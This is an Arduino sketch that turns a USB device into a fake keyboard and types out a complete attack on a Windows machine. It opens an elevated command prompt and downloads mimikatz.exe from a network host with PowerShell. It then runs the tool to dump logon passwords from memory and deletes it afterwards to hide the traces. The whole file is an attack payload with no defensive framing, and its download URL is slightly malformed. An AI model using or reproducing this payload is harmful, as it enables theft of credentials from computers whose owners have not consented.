#include <Keyboard.h>
// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{

  delay(20000);
  // Start Keyboard and Mouse
  Keyboard.begin();

  // Start Payload
  // mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  delay(3000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(4000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(1000);

  typeKey(KEY_RETURN);

  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('http://http://192.168.100.7:8887/x64//mimikatz.exe','%TEMP%\\mimikatz.exe')");

  delay(300);

  typeKey(KEY_RETURN);

  delay(6000);

  Keyboard.print("%TEMP%\\mimikatz.exe");

  delay(300);

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("privilege::debug");

  delay(300);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sekurlsa::logonPasswords full");

  delay(300);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");

  delay(300);

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("del %TEMP%\\mimikatz.exe");

  delay(300);

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
